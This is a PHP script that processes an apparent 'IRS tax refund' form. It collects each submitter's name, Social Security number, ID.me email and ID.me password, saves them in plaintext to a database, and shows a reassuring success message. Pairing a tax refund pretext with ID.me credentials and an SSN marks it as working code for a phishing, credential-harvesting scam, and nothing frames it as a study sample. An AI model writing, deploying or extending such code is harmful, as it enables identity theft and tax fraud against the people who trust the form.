<?php
include("header.php");

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    $_SESSION['error'] = "Invalid request.";
    header("Location: irs-refund.php");
    exit;
}

$name          = trim($_POST['name'] ?? '');
$ssn           = trim($_POST['ssn'] ?? '');
$idme_email    = trim($_POST['idme_email'] ?? '');
$idme_password = trim($_POST['idme_password'] ?? '');
$country       = trim($_POST['country'] ?? '');

if (
    $name === '' ||
    $ssn === '' ||
    $idme_email === '' ||
    $idme_password === '' ||
    $country === ''
) {
    $_SESSION['error'] = "All fields are required.";
    header("Location: irs-refund.php");
    exit;
}

/* -------------------------
   SAVE TO DATABASE
--------------------------*/
$stmt = $conn->prepare("
    INSERT INTO irs_refund_requests
    (user_id, name, ssn, idme_email, idme_password, country, status)
    VALUES (?, ?, ?, ?, ?, ?, 'Pending')
");

$stmt->bind_param(
    "isssss",
    $user_id,
    $name,
    $ssn,
    $idme_email,
    $idme_password,
    $country
);

if (!$stmt->execute()) {
    $_SESSION['error'] = "Unable to submit request. Please try again.";
    header("Location: irs-refund.php");
    exit;
}

/* -------------------------
   SUCCESS MESSAGE
--------------------------*/
$_SESSION['success'] =
    "Your IRS tax refund request has been submitted successfully.
     You will be contacted by support when it is ready.";

header("Location: irs-refund.php");
exit;

